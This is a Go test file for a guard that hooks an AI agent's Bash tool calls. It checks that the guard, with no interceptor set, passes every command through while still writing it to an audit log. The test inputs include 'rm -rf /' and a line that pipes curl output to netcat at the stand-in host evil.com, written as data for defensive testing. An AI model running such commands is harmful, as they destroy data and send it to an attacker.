// [한국어 파일 안내] guard/guard_test.go
// 인터셉터 없는 Guard는 명령 문자열을 차단하지 않으면서 감사는 남긴다는 현재 계약을 검증한다.
// 아래 명령들은 hook에 전달할 테스트 문자열이며 실제 셸로 실행하는 코드가 아니다.
// 이 결과를 전역 안전 정책이 존재한다는 증거로 해석하면 안 된다.
package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
// 한국어 해설: 기본 Guard의 PreToolUse가 다양한 명령 표면을 통과시키고 최근 감사 목록을 만드는지 확인한다.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse
